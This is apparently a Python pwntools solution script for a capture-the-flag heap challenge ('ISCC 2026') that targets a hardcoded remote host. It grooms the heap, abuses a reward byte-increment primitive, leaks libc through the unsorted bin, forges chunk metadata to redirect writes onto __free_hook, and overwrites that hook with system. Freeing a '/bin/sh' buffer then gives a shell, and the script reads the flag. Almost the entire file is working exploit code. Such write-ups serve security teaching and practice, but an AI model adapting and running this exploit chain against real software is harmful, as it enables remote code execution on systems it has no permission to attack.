#!/usr/bin/env python3
"""
ISCC 2026 PWN Challenge - Solution Script
Remote target: 39.96.193.120:10015

Vulnerability: Menu-based heap exploitation via pray+set_mode low-byte overwrite
  and reward-based arbitrary byte increment + heap leak.
"""

from pwn import *
import sys

# ============================================================
# Configuration
# ============================================================
BINARY = "./attachment-35"
LIBC_PATH = "./attachment-35.so"
HOST = "39.96.193.120"
PORT = 10015

context.binary = ELF(BINARY, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
context.arch = "amd64"
context.log_level = "info"

# ============================================================
# Helper: Binary I/O wrapper around pwntools
# ============================================================
def u64b(data):
    return u64(data.ljust(8, b"\x00"))


class Challenge:
    """Wraps the remote connection and exposes menu actions."""

    def __init__(self, io):
        self.io = io

    # ---- low-level helpers ----
    def sendl(self, delim, data):
        self.io.sendlineafter(delim, data)

    def send(self, delim, data):
        self.io.sendafter(delim, data)

    def menu_choose(self, idx):
        self.sendl(b"choice>> ", str(idx).encode())

    # ---- role switching ----
    def to_teacher(self):
        self.menu_choose(5)
        self.sendl(b"role: <0.teacher/1.student>: ", b"0")

    def to_student(self):
        self.menu_choose(5)
        self.sendl(b"role: <0.teacher/1.student>: ", b"1")

    # ---- teacher operations ----
    def add_student(self, qnum=9):
        self.menu_choose(1)
        self.sendl(b"enter the number of questions: ", str(qnum).encode())

    def grade_all(self):
        """Score all students. Returns dict of {id: score}."""
        self.menu_choose(2)
        prompt = b"choice>> "
        raw = self.io.recvuntil(prompt)
        self.io.unrecv(prompt)
        pairs = re.findall(rb"score for the (\d+)th student is (-?\d+)", raw)
        return {int(i): int(v) for i, v in pairs}

    def write_review(self, idx, data, size=None):
        """Teacher writes a review for student idx.
        If size is None → rewrite existing review (data replaces content).
        If size is set → allocate new review with given size, then write data.
        """
        self.menu_choose(3)
        self.sendl(b"which one? > ", str(idx).encode())
        if size is None:
            # rewrite existing review
            self.send(b"enter your comment:", data)
        else:
            self.sendl(b"please input the size of comment: ", str(size).encode())
            self.send(b"enter your comment:", data)

    def call_parent(self, idx):
        """Frees the student (review chunk, info chunk, wrap chunk)."""
        self.menu_choose(4)
        self.sendl(b"which student id to choose?", str(idx).encode())

    # ---- student operations ----
    def change_id(self, idx):
        self.menu_choose(6)
        self.sendl(b"input your id: ", str(idx).encode())

    def do_test(self):
        self.menu_choose(1)

    def check_review(self):
        """Student checks their review. Returns (leaked_addr, raw_review_output)."""
        self.menu_choose(2)

    def pray(self):
        """Toggles the prayer flag (prayed ^= 1)."""
        self.menu_choose(3)

    def set_mode(self, payload=None, pray_score=None):
        """Two modes:
        - pray_score is set → writes value to low byte of mode_ptr
        - payload is set → writes 0x20 bytes to mode_ptr
        """
        self.menu_choose(4)
        if pray_score is not None:
            self.sendl(b"enter your pray score: 0 to 100", str(pray_score).encode())
        else:
            self.send(b"enter your mode!", payload)

    # ---- reward flow ----
    def make_rewardable(self, idx):
        """Trick the grade system into giving student idx a rewardable score."""
        self.to_student()
        self.change_id(idx)
        self.pray()
        self.to_teacher()
        scores = self.grade_all()
        while scores[idx] >= 10:
            scores = self.grade_all()
        return scores[idx]

    def claim_reward(self, idx):
        """Claim reward for student idx. Returns the heap leak address."""
        self.to_student()
        self.change_id(idx)
        self.check_review()
        self.io.recvuntil(b"Good Job! Here is your reward! ")
        heap_leak = int(self.io.recvline().strip(), 16)
        self.io.recvuntil(b"addr: ")
        return heap_leak

    def reward_increment(self, addr):
        """Use the reward's single-byte increment on an arbitrary address.
        NOTE: sub_131A zeroes the byte before newline, so we append a guard
        character '1' to protect the last digit of addr."""
        self.io.sendline((str(addr) + "1").encode())

    # ---- exploitation helpers ----
    def read_review_leak(self):
        """After reward flow, reads 'here is the review:' content and returns leaked bytes."""
        self.io.recvuntil(b"here is the review:\n")
        return self.io.recv(7)  # partial pointer from unsorted bin

    def cat_flag(self):
        """Try various commands to read the flag."""
        commands = [
            b"cat /flag",
            b"cat /flag*",
            b"cat flag",
            b"cat ./flag",
        ]
        for cmd in commands:
            self.io.sendline(cmd)
            data = self.io.recvrepeat(0.8)
            if data:
                try:
                    print(data.decode("latin-1", errors="ignore"), end="")
                except Exception:
                    print(repr(data))
            if b"ISCC{" in data:
                return True
        return False


# ============================================================
# Exploit logic
# ============================================================
def exploit(io):
    ch = Challenge(io)

    # ---- Initial role: teacher ----
    ch.sendl(b"role: <0.teacher/1.student>: ", b"0")

    # ----------------------------------------------------------
    # Phase 1: Heap grooming
    #  Create students + reviews to build predictable heap layout
    # ----------------------------------------------------------

    # Student 0: review size = 0xa0  (tcache bin range)
    ch.add_student(9)
    ch.write_review(0, b"stage_0", size=0xA0)

    # Student 1: large review = 0x3f0  (unsorted bin range)
    ch.add_student(9)
    ch.write_review(1, b"stage_1", size=0x3F0)

    # Student 2: review size = 0xa0
    ch.add_student(9)
    ch.write_review(2, b"stage_2", size=0xA0)

    # Student 3: review size = 0x200
    ch.add_student(9)
    ch.write_review(3, b"stage_3", size=0x200)

    # ----------------------------------------------------------
    # Phase 2: First reward → heap anchor + byte patches
    #  Make student 3 rewardable to get heap leak and two +1 ops
    # ----------------------------------------------------------
    ch.make_rewardable(3)
    anchor = ch.claim_reward(3)
    log.info(f"anchor (student 3 wrap) = {anchor:#x}")

    # Compute offsets relative to anchor for two write addresses
    # These target fake-chunk metadata bytes that need +1
    patch_a = anchor - 0x617
    patch_b = patch_a + 0x110
    ch.reward_increment(patch_a)

    # ----------------------------------------------------------
    # Phase 3: Second reward → second byte patch
    #  Create 3 more students with 0x300 reviews, make student 4 rewardable
    # ----------------------------------------------------------
    ch.to_teacher()
    ch.add_student(9)
    ch.write_review(4, b"stage_4", size=0x300)
    ch.add_student(9)
    ch.write_review(5, b"stage_5", size=0x300)
    ch.add_student(9)
    ch.write_review(6, b"stage_6", size=0x300)

    ch.make_rewardable(4)
    ch.claim_reward(4)
    ch.reward_increment(patch_b)

    # ----------------------------------------------------------
    # Phase 4: Unsorted bin attack → libc leak
    #  Make student 0 rewardable, then call_parent on student 1
    #  to free the 0x3f0 chunk into unsorted bin.
    #  Then use reward to patch a byte and read the leaked main_arena ptr.
    # ----------------------------------------------------------
    ch.make_rewardable(0)
    ch.to_teacher()
    ch.call_parent(1)

    ch.to_student()
    ch.change_id(0)
    ch.check_review()

    ch.io.recvuntil(b"Good Job! Here is your reward! ")
    spill = int(ch.io.recvline().strip(), 16)
    ch.io.recvuntil(b"addr: ")
    # Patch a byte so the unsorted-bin pointer appears in review content
    ch.reward_increment(spill + 0x40 + 2)

    main_arena = u64b(ch.read_review_leak()) - 96
    libc_base = main_arena - (libc.sym["__malloc_hook"] + 0x10)
    libc.address = libc_base

    log.success(f"main_arena @ {main_arena:#x}")
    log.success(f"libc base   @ {libc_base:#x}")

    # ----------------------------------------------------------
    # Phase 5: Forge fake structures to gain arbitrary write
    #  Use review overwrite to place a crafted layout that makes
    #  subsequent review rewrites target __free_hook.
    # ----------------------------------------------------------
    free_hook = libc.sym["__free_hook"]
    system_addr = libc.sym["system"]
    log.info(f"__free_hook @ {free_hook:#x}")
    log.info(f"system      @ {system_addr:#x}")

    ch.to_teacher()

    # Build fake object chain that redirects review writes to __free_hook
    fake_payload = (
        p64(main_arena + 96)           # fake info ptr slot
        + p64(main_arena + 96)         # fake info ptr slot
        + b"X" * 0x4E0                 # padding
        + p64(0x500)                   # fake size metadata
        + p64(0x30)                    # chunk size
        + p64(anchor + 0x30)           # backward pointer
        + p64(0) * 2
        + p64(0x0000000100000001)
        + p64(0)
        + p64(0x21)                    # chunk header
        + p64(0x0000004800000009)
        + p64(free_hook)              # → target for next rewrite
        + p64(0x200)
        + p64(0x201)
        + p64(0xA777777)
    )
    ch.write_review(0, fake_payload, size=None)

    # Now student 3's review area is aliased to __free_hook
    # Write system address there
    ch.write_review(3, p64(system_addr), size=None)

    # Write "/bin/sh" into student 5's review area
    ch.write_review(5, b"/bin/sh\x00", size=None)

    # ----------------------------------------------------------
    # Phase 6: Trigger
    #  call_parent on student 5 → free("/bin/sh") → system("/bin/sh")
    # ----------------------------------------------------------
    ch.call_parent(5)

    sleep(1)
    ch.cat_flag()
    io.interactive()


# ============================================================
# Entry point
# ============================================================
if __name__ == "__main__":
    io = remote(HOST, PORT)
    exploit(io)
